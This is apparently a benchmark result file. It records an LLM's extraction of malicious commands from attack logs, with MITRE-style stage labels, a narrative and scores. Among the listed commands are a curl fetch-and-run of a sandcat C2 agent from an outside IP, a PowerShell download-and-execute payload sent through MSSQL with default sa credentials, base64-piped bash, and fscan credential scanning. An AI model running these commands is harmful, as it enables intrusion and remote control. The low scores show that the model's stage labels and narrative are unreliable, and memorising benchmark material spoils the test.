@@ -1,0 +1,110 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c \"echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d | bash\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c \"/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/node\" -p \"ca8f367fc32a\" + JSON.stringify(process.env) + \"ca8f367fc32a\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ; nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sh -c \"./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c \"./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip='https://124.223.85.207:8443'';[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+''/file/download'';$wc=New-Object System.Net.WebClient;$wc.Headers.add(''company_code'',1234567);$wc.Headers.add(''platform,'',''windows'');$wc.Headers.add(''file,'',''sandcat.go''); $output=''C:\\\\Users\\\\Public\\\\sandcat.exe'';$wc.DownloadFile($url,$output);cmd /c start /min C:\\\\Users\\\\Public\\\\sandcat.exe' '-opid 9f726796-b4f3-463f-8cfd-4f1498314252...\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sh -c \"mkdir -p fscan && unzip -o -d ./fscan fscan-main.zip && chmod +x ./fscan/main && ./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c 'del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt'",
+        "stage": "Collection"
+      },
+      {
+        "command": "sh -c 'del /f /q c:\\windows\\logout.jsp'",
+        "stage": "Collection"
+      },
+      {
+        "command": "sh -c './sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami'",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c './sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami'",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c 'curl -k --connect-timeout 10 \"https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100\"}'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sh -c 'sh -c \"/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh\" 294687 294943 295048 294944 295049'",
+        "stage": "Persistence"
+      },
+      {
+        "command": "sh -c 'top'",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c 'sh -c \"/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh\" 294687 294943 295048 295125 294944 295049'",
+        "stage": "Persistence"
+      },
+      {
+        "command": "sh -c 'kill -9 `lsof -i:8080 -t` ; nohup timeout 600 python -m SimpleHTTPServer 8079 > /dev/null 2>&1 &' ",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attack begins with initial access using a Base64-encoded string executed via Bash. The attackers leverage persistent mechanisms like Node.js and cron jobs to escalate privileges and establish long-term control. They further exploit discovered vulnerabilities such as outdated services by running PowerShell commands to download and execute remote malware. During the course of the attack, the intruders collect system data and attempt to mask their activities by deleting sensitive logs and manipulating service states.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 48805,
+      "completion_tokens": 3572,
+      "total_tokens": 52377,
+      "wall_clock_s": 43.659,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.3333333333333333,
+      "recall": 0.7142857142857143,
+      "f1": 0.4545454545454545,
+      "tp": 5,
+      "fp": 10,
+      "fn": 2
+    },
+    "stage": {
+      "precision": 0.06666666666666667,
+      "recall": 0.14285714285714285,
+      "f1": 0.09090909090909091,
+      "tp": 1,
+      "fp": 14,
+      "fn": 6,
+      "recall_partial": 0.42857142857142855
+    },
+    "hallucination_rate": 0.06666666666666667,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 48805,
+      "completion_tokens": 3572,
+      "total_tokens": 52377,
+      "wall_clock_s": 43.659,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
